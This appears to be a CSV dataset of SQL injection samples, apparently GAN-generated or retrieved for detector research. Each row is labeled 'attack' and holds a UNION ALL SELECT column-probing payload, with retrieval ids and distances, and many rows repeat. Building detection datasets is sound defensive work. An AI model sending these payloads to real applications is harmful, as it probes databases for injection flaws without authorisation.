id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.237202254525953
GAN_000002,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,8.674969993257559
GAN_000003,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.303126759340375
GAN_000004,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,5.449145586024525
GAN_000005,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.818694154342954
GAN_000006,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.2994479679882103
GAN_000007,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.07207905862008
GAN_000008,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,5.541055261226671
GAN_000009,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.721687767231345
GAN_000010,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,3.7941118187626732
GAN_000011,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000307,4.246702093497433
GAN_000012,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,7.105713502554321
GAN_000013,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000970,6.812805929178436
GAN_000014,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,4.106347357876569
GAN_000015,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.363321077039675
GAN_000016,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,5.801829184083651
GAN_000017,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.2357610428596897
GAN_000018,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,5.708079114534061
GAN_000019,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,4.2366245801243725
GAN_000020,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,6.916189558954177
GAN_000021,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,5.564941959314022
GAN_000022,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,5.680542616668327
GAN_000023,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,5.413145838839844
GAN_000024,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.750550287736684
GAN_000025,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.959935429129252
GAN_000026,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.779748458662348
GAN_000027,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,5.183172749945368
GAN_000028,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,8.356605348331566
GAN_000029,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.572903619480914
GAN_000030,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.534904171146545
GAN_000031,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.001087288067068
GAN_000032,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R001406,4.578494686415934
GAN_000033,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.285139618559105
GAN_000034,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,6.715453833201284
GAN_000035,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.908524080999418
GAN_000036,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,3.645915422451914
